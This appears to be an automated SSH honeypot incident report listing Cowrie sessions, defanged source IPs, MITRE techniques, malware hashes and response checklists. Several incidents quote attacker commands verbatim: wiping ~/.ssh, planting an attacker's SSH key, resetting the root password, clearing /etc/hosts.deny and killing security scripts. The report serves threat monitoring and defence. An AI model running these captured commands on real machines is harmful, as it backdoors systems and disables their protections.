- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed292917b80e

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:45` | `cowrie.session.connect` |
| `2026-03-28 05:22:45` | `cowrie.client.version` |
| `2026-03-28 05:22:45` | `cowrie.client.kex` |
| `2026-03-28 05:22:46` | `cowrie.login.success` |
| `2026-03-28 05:22:46` | `cowrie.session.params` |
| `2026-03-28 05:22:46` | `cowrie.command.input` |
| `2026-03-28 05:22:46` | `cowrie.log.closed` |
| `2026-03-28 05:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7f69f1f3721

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:22 |
| **Last Seen** | 2026-03-28 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:22:49` | `cowrie.session.connect` |
| `2026-03-28 05:22:49` | `cowrie.client.version` |
| `2026-03-28 05:22:50` | `cowrie.client.kex` |
| `2026-03-28 05:22:50` | `cowrie.login.success` |
| `2026-03-28 05:22:50` | `cowrie.session.params` |
| `2026-03-28 05:22:50` | `cowrie.command.input` |
| `2026-03-28 05:22:50` | `cowrie.log.closed` |
| `2026-03-28 05:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784cd130a514

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:23 |
| **Last Seen** | 2026-03-28 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:23:20` | `cowrie.session.connect` |
| `2026-03-28 05:23:20` | `cowrie.client.version` |
| `2026-03-28 05:23:21` | `cowrie.client.kex` |
| `2026-03-28 05:23:21` | `cowrie.login.success` |
| `2026-03-28 05:23:21` | `cowrie.session.params` |
| `2026-03-28 05:23:21` | `cowrie.command.input` |
| `2026-03-28 05:23:21` | `cowrie.log.closed` |
| `2026-03-28 05:23:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c727081ec840

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:23 |
| **Last Seen** | 2026-03-28 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:23:22` | `cowrie.session.connect` |
| `2026-03-28 05:23:22` | `cowrie.client.version` |
| `2026-03-28 05:23:22` | `cowrie.client.kex` |
| `2026-03-28 05:23:22` | `cowrie.login.success` |
| `2026-03-28 05:23:22` | `cowrie.session.params` |
| `2026-03-28 05:23:22` | `cowrie.command.input` |
| `2026-03-28 05:23:23` | `cowrie.log.closed` |
| `2026-03-28 05:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a751ecbb3ea

| Field | Detail |
|---|---|
| **Source IP** | `8.138.226[.]108` |
| **First Seen** | 2026-03-28 05:23 |
| **Last Seen** | 2026-03-28 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo -e "\x6F\x6B"` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:23:53` | `cowrie.session.connect` |
| `2026-03-28 05:23:53` | `cowrie.client.version` |
| `2026-03-28 05:23:53` | `cowrie.client.kex` |
| `2026-03-28 05:23:53` | `cowrie.login.success` |
| `2026-03-28 05:23:54` | `cowrie.session.params` |
| `2026-03-28 05:23:54` | `cowrie.command.input` |
| `2026-03-28 05:23:54` | `cowrie.log.closed` |
| `2026-03-28 05:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.138.226[.]108` to AbuseIPDB if not already reported
- [ ] Block `8.138.226[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6dcdfd8ee89

| Field | Detail |
|---|---|
| **Source IP** | `78.36.41[.]213` |
| **First Seen** | 2026-03-28 05:28 |
| **Last Seen** | 2026-03-28 05:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:28:32` | `cowrie.session.connect` |
| `2026-03-28 05:28:32` | `cowrie.client.version` |
| `2026-03-28 05:28:32` | `cowrie.client.kex` |
| `2026-03-28 05:28:34` | `cowrie.login.success` |
| `2026-03-28 05:28:34` | `cowrie.direct-tcpip.request` |
| `2026-03-28 05:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.36.41[.]213` to AbuseIPDB if not already reported
- [ ] Block `78.36.41[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69999e3c6f1c

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-03-28 05:28 |
| **Last Seen** | 2026-03-28 05:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:28:39` | `cowrie.session.connect` |
| `2026-03-28 05:28:39` | `cowrie.client.version` |
| `2026-03-28 05:28:39` | `cowrie.client.kex` |
| `2026-03-28 05:28:41` | `cowrie.login.success` |
| `2026-03-28 05:28:41` | `cowrie.direct-tcpip.request` |
| `2026-03-28 05:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f6123b3bdf

| Field | Detail |
|---|---|
| **Source IP** | `218.248.9[.]102` |
| **First Seen** | 2026-03-28 05:39 |
| **Last Seen** | 2026-03-28 05:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:39:57` | `cowrie.session.connect` |
| `2026-03-28 05:39:58` | `cowrie.client.version` |
| `2026-03-28 05:39:58` | `cowrie.client.kex` |
| `2026-03-28 05:39:59` | `cowrie.login.success` |
| `2026-03-28 05:39:59` | `cowrie.direct-tcpip.request` |
| `2026-03-28 05:40:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.9[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.9[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b38ec4db896

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-03-28 05:40 |
| **Last Seen** | 2026-03-28 05:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 05:40:09` | `cowrie.session.connect` |
| `2026-03-28 05:40:10` | `cowrie.client.version` |
| `2026-03-28 05:40:10` | `cowrie.client.kex` |
| `2026-03-28 05:40:12` | `cowrie.login.success` |
| `2026-03-28 05:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b18eb22eeb1

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-03-28 06:03 |
| **Last Seen** | 2026-03-28 06:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 06:03:48` | `cowrie.session.connect` |
| `2026-03-28 06:03:48` | `cowrie.client.version` |
| `2026-03-28 06:03:48` | `cowrie.client.kex` |
| `2026-03-28 06:03:49` | `cowrie.login.success` |
| `2026-03-28 06:03:49` | `cowrie.session.params` |
| `2026-03-28 06:03:49` | `cowrie.command.input` |
| `2026-03-28 06:03:49` | `cowrie.command.failed` |
| `2026-03-28 06:03:49` | `cowrie.log.closed` |
| `2026-03-28 06:03:49` | `cowrie.session.params` |
| `2026-03-28 06:03:49` | `cowrie.command.input` |
| `2026-03-28 06:03:49` | `cowrie.session.file_download` |
| `2026-03-28 06:03:49` | `cowrie.log.closed` |
| `2026-03-28 06:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd67a9f5758c

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-03-28 06:03 |
| **Last Seen** | 2026-03-28 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 06:03:51` | `cowrie.session.connect` |
| `2026-03-28 06:03:51` | `cowrie.client.version` |
| `2026-03-28 06:03:51` | `cowrie.client.kex` |
| `2026-03-28 06:03:52` | `cowrie.login.success` |
| `2026-03-28 06:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37fd8ed0b6d6

| Field | Detail |
|---|---|
| **Source IP** | `58.187.118[.]57` |
| **First Seen** | 2026-03-28 06:09 |
| **Last Seen** | 2026-03-28 06:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 06:09:45` | `cowrie.session.connect` |
| `2026-03-28 06:09:45` | `cowrie.client.version` |
| `2026-03-28 06:09:45` | `cowrie.client.kex` |
| `2026-03-28 06:09:45` | `cowrie.login.success` |
| `2026-03-28 06:09:46` | `cowrie.session.params` |
| `2026-03-28 06:09:46` | `cowrie.command.input` |
| `2026-03-28 06:09:46` | `cowrie.command.failed` |
| `2026-03-28 06:09:46` | `cowrie.log.closed` |
| `2026-03-28 06:09:46` | `cowrie.session.params` |
| `2026-03-28 06:09:46` | `cowrie.command.input` |
| `2026-03-28 06:09:46` | `cowrie.session.file_download` |
| `2026-03-28 06:09:46` | `cowrie.log.closed` |
| `2026-03-28 06:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.187.118[.]57` to AbuseIPDB if not already reported
- [ ] Block `58.187.118[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944a9b72d3ec

| Field | Detail |
|---|---|
| **Source IP** | `58.187.118[.]57` |
| **First Seen** | 2026-03-28 06:09 |
| **Last Seen** | 2026-03-28 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 06:09:48` | `cowrie.session.connect` |
| `2026-03-28 06:09:48` | `cowrie.client.version` |
| `2026-03-28 06:09:48` | `cowrie.client.kex` |
| `2026-03-28 06:09:49` | `cowrie.login.success` |
| `2026-03-28 06:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.187.118[.]57` to AbuseIPDB if not already reported
- [ ] Block `58.187.118[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3725cc9b0c3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]227` |
| **First Seen** | 2026-03-28 06:17 |
| **Last Seen** | 2026-03-28 06:18 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OAqhgPzg0SG1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 06:17:58` | `cowrie.session.connect` |
| `2026-03-28 06:17:58` | `cowrie.client.version` |
| `2026-03-28 06:17:59` | `cowrie.client.kex` |
| `2026-03-28 06:18:00` | `cowrie.login.success` |
| `2026-03-28 06:18:00` | `cowrie.session.params` |
| `2026-03-28 06:18:00` | `cowrie.command.input` |
| `2026-03-28 06:18:00` | `cowrie.command.failed` |
| `2026-03-28 06:18:00` | `cowrie.log.closed` |
| `2026-03-28 06:18:01` | `cowrie.session.params` |
| `2026-03-28 06:18:01` | `cowrie.command.input` |
| `2026-03-28 06:18:01` | `cowrie.session.file_download` |
| `2026-03-28 06:18:01` | `cowrie.log.closed` |
| `2026-03-28 06:18:11` | `cowrie.session.params` |
| `2026-03-28 06:18:11` | `cowrie.command.input` |
| `2026-03-28 06:18:11` | `cowrie.log.closed` |
| `2026-03-28 06:18:11` | `cowrie.session.params` |
| `2026-03-28 06:18:11` | `cowrie.command.input` |
| `2026-03-28 06:18:11` | `cowrie.log.closed` |
| `2026-03-28 06:18:12` | `cowrie.session.params` |
| `2026-03-28 06:18:12` | `cowrie.command.input` |
| `2026-03-28 06:18:12` | `cowrie.session.file_download` |
| `2026-03-28 06:18:12` | `cowrie.log.closed` |
| `2026-03-28 06:18:12` | `cowrie.session.params` |
| `2026-03-28 06:18:12` | `cowrie.command.input` |
| `2026-03-28 06:18:12` | `cowrie.log.closed` |
| `2026-03-28 06:18:13` | `cowrie.session.params` |
| `2026-03-28 06:18:13` | `cowrie.command.input` |
| `2026-03-28 06:18:14` | `cowrie.log.closed` |
| `2026-03-28 06:18:14` | `cowrie.session.params` |
| `2026-03-28 06:18:14` | `cowrie.command.input` |
| `2026-03-28 06:18:14` | `cowrie.command.input` |
| `2026-03-28 06:18:14` | `cowrie.log.closed` |
| `2026-03-28 06:18:14` | `cowrie.session.params` |
| `2026-03-28 06:18:14` | `cowrie.command.input` |
| `2026-03-28 06:18:15` | `cowrie.log.closed` |
| `2026-03-28 06:18:16` | `cowrie.session.params` |
| `2026-03-28 06:18:16` | `cowrie.command.input` |
| `2026-03-28 06:18:16` | `cowrie.log.closed` |
| `2026-03-28 06:18:16` | `cowrie.session.params` |
| `2026-03-28 06:18:16` | `cowrie.command.input` |
| `2026-03-28 06:18:17` | `cowrie.log.closed` |
| `2026-03-28 06:18:17` | `cowrie.session.params` |
| `2026-03-28 06:18:17` | `cowrie.command.input` |
| `2026-03-28 06:18:17` | `cowrie.log.closed` |
| `2026-03-28 06:18:18` | `cowrie.session.params` |
| `2026-03-28 06:18:18` | `cowrie.command.input` |
| `2026-03-28 06:18:18` | `cowrie.log.closed` |
| `2026-03-28 06:18:18` | `cowrie.session.params` |
| `2026-03-28 06:18:18` | `cowrie.command.input` |
| `2026-03-28 06:18:19` | `cowrie.log.closed` |
| `2026-03-28 06:18:19` | `cowrie.session.params` |
| `2026-03-28 06:18:19` | `cowrie.command.input` |
| `2026-03-28 06:18:20` | `cowrie.log.closed` |
| `2026-03-28 06:18:21` | `cowrie.session.params` |
| `2026-03-28 06:18:21` | `cowrie.command.input` |
| `2026-03-28 06:18:21` | `cowrie.log.closed` |
| `2026-03-28 06:18:21` | `cowrie.session.params` |
| `2026-03-28 06:18:21` | `cowrie.command.input` |
| `2026-03-28 06:18:21` | `cowrie.log.closed` |
| `2026-03-28 06:18:21` | `cowrie.session.params` |
| `2026-03-28 06:18:21` | `cowrie.command.input` |
| `2026-03-28 06:18:22` | `cowrie.log.closed` |
| `2026-03-28 06:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]227` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.114[.]227` | **5** | 2026-03-28 06:08 | 2026-03-28 06:21 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `147.50.231[.]135` | **3** | 2026-03-28 05:01 | 2026-03-28 05:12 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `3.132.26[.]232` | **2** | 2026-03-28 04:37 | 2026-03-28 04:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]69` | 1 | 2026-03-28 05:08 | 2026-03-28 05:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.37.30[.]134` | 1 | 2026-03-28 05:21 | 2026-03-28 05:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]2` | 1 | 2026-03-28 06:24 | 2026-03-28 06:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.124.96[.]19` | 1 | 2026-03-28 05:27 | 2026-03-28 05:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `112.86.146[.]178` | 1 | 2026-03-28 05:13 | 2026-03-28 05:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.242.185[.]233` | 1 | 2026-03-28 06:04 | 2026-03-28 06:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-03-28 05:40 | 2026-03-28 05:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `119.152.232[.]167` | 1 | 2026-03-28 06:23 | 2026-03-28 06:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.139.154[.]159` | 1 | 2026-03-28 06:28 | 2026-03-28 06:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.148.199[.]165` | 1 | 2026-03-28 06:48 | 2026-03-28 06:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.215.199[.]37` | 1 | 2026-03-28 05:19 | 2026-03-28 05:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]25` | 1 | 2026-03-28 04:33 | 2026-03-28 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]75` | 1 | 2026-03-28 04:35 | 2026-03-28 04:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.116.204[.]225` | 1 | 2026-03-28 05:57 | 2026-03-28 05:58 | 33s | 0 | `T1592` | 🟢 LOW |
| `150.228.210[.]69` | 1 | 2026-03-28 05:04 | 2026-03-28 05:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `155.212.17[.]174` | 1 | 2026-03-28 04:28 | 2026-03-28 04:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.141.19[.]44` | 1 | 2026-03-28 06:00 | 2026-03-28 06:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.239.78[.]124` | 1 | 2026-03-28 05:44 | 2026-03-28 05:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.81.169[.]235` | 1 | 2026-03-28 04:37 | 2026-03-28 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.72.7[.]53` | 1 | 2026-03-28 04:35 | 2026-03-28 04:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.208.209[.]215` | 1 | 2026-03-28 06:20 | 2026-03-28 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.25.233[.]22` | 1 | 2026-03-28 04:59 | 2026-03-28 04:59 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.42[.]212` | 1 | 2026-03-28 06:10 | 2026-03-28 06:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.17.5[.]126` | 1 | 2026-03-28 06:03 | 2026-03-28 06:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.170.50[.]2` | 1 | 2026-03-28 05:51 | 2026-03-28 05:51 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]242` | 1 | 2026-03-28 06:48 | 2026-03-28 06:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.187.118[.]57` | 1 | 2026-03-28 06:09 | 2026-03-28 06:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.14.170[.]169` | 1 | 2026-03-28 06:29 | 2026-03-28 06:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.99.177[.]131` | 1 | 2026-03-28 05:06 | 2026-03-28 05:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.251.229[.]144` | 1 | 2026-03-28 05:32 | 2026-03-28 05:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.138.226[.]108` | 1 | 2026-03-28 05:22 | 2026-03-28 05:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.131.211[.]168` | 1 | 2026-03-28 05:24 | 2026-03-28 05:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
